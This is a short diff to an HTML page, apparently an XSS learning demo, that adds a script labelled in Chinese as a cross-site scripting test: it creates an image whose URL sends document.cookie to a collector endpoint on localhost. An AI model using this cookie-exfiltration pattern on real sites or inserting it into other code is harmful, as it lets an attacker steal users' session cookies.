@@ -12,6 +12,11 @@
         document.cookie = 'username=John Smith; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/'
         const cookie = document.cookie
         console.log('当前 cookie', cookie)
+
+        // 测试跨站脚本攻击
+        let img = document.createElement('img');
+        img.src = `https://localhost:7272/Xss/WriteCookie?cookie=${encodeURIComponent(document.cookie)}`;
+        document.body.appendChild(img);
     </script>
 </body>
 </html>
